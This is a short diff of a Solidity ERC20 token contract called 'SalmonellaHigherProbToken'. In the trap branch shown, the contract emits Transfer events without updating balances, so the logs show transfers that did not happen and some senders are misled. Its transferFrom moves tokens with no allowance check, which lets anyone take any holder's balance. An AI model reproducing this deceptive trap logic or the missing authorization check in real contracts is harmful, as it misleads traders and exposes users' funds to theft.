@@ -95,8 +95,6 @@ contract SalmonellaHigherProbToken is IERC20 {
      */
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        // THIS IS THE LINE THAT IF WE UNCOMMENT , IT DOES NOT WORK
-        //_approve(sender, recipient, _allowances[sender][recipient] - amount);
         return true;
     }
      /**
@@ -125,17 +123,15 @@ contract SalmonellaHigherProbToken is IERC20 {
           uint256 trapProb = amount / senderBalance;
           
           if (random() < trapProb * 100) {
-              //trapped
-              //_balances[sender] = senderBalance - amount;
-              //_balances[recipient] += amount;
+              // Trapped
               emit Transfer(sender, recipient, amount);
           } else {
+	      // Not trapped -> Normal tranfer
               _balances[sender] = senderBalance - amount;
               _balances[recipient] += amount;
               emit Transfer(sender, recipient, amount);
           }
        }
-
     }
     
     /**
